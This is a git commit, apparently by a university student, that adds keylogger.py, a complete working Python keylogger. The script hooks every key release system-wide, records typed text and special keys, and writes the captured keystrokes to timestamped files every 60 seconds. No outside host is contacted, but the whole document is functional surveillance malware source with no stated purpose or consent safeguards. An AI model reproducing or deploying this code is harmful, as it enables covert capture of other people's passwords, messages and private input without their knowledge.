80db784a16b295bc02a074b80876f96f369a6662
Veronica Wondo <z5259146@student.unsw.edu.au>
2021-03-15 03:17:08 +1100

    implemented basic key logger

---
+++ keylogger.py
@@ -0,0 +1,77 @@
+import keyboard
+from threading import Timer
+from datetime import datetime
+
+# temporary time frame for report
+SEND_REPORT_EVERY = 60
+
+class Keylogger:
+    def __init__(self, interval, report_method="file"):
+        self.interval = interval
+        self.report_method = report_method
+        # keep log as single string
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+    
+    def update_filename(self):
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
+    def report(self):
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "file":
+                self.report_to_file()
+            # print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        keyboard.wait()
+
+    
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
